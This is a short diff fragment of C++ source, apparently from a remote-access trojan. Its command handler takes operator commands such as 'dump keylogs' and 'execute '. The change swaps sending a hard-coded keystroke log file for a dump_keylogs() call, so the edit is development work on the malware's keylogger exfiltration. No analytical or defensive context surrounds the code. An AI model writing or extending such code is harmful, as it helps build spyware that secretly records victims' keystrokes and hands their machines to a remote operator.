@@ -62,7 +62,7 @@ void handle_command(CLIENT& client, string& command)
 	}
 	else if(command == "dump keylogs")
 	{
-		client.send_file("C:\\ender\\log.txt");
+		client.dump_keylogs();
 	}
 	else if(command.substr(0,8) == "execute ")
 	{
